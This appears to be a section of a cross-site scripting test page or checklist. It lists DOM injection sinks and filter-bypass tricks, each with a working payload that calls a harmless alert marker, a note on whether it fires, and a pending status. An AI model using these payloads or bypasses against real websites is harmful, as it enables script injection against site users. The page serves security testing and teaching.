2. DOM Injection Sinks

Direct injection into unsafe DOM APIs.

innerHTML (script tag)
el.innerHTML = '<script>xssAlert("innerHTML script")</script>'
Script tags injected via innerHTML are NOT executed by modern browsers
PENDING
innerHTML (img onerror)
el.innerHTML = '<img src=x onerror=xssAlert("img onerror")>'
Event handlers on injected elements DO execute — this fires
PENDING
innerHTML (svg onload)
el.innerHTML = '<svg onload=xssAlert("svg onload")></svg>'
SVG elements with event handlers execute inline JS
PENDING
innerHTML (body onload via svg)
el.innerHTML = '<svg><animate onbegin=xssAlert("animate onbegin")></svg>'
SVG animate element with onbegin event handler
PENDING
outerHTML replacement
el.outerHTML = '<img src=x onerror=xssAlert("outerHTML")>'
outerHTML replaces the target element entirely — event handlers fire
PENDING
insertAdjacentHTML
el.insertAdjacentHTML('beforeend', '<img src=x onerror=xssAlert("insertAdjacentHTML")>')
insertAdjacentHTML is equally unsafe as innerHTML
PENDING
document.write
document.write('<img src=x onerror=xssAlert("document.write")>')
document.write executes immediately and is a classic XSS sink
PENDING

6. Encoding & Filter Bypasses

Payloads that evade naive keyword-based filters.

HTML entity encoding
<img src=x onerror=xssAlert('entities')>
Attribute values are decoded before execution — entity encoding bypasses string filters
PENDING
Mixed case
<ScRiPt>xssAlert('mixed case')</sCrIpT> via document.write
HTML parsing is case-insensitive — case-based filters are trivially bypassed
PENDING
SVG namespace bypass
<svg><script>xssAlert('svg script')</script></svg>
Scripts inside SVG tags execute — unlike scripts in HTML via innerHTML
PENDING
Double encoding
%253Cscript%253E decoded twice to <script>
Servers that decode once before sanitizing miss double-encoded payloads
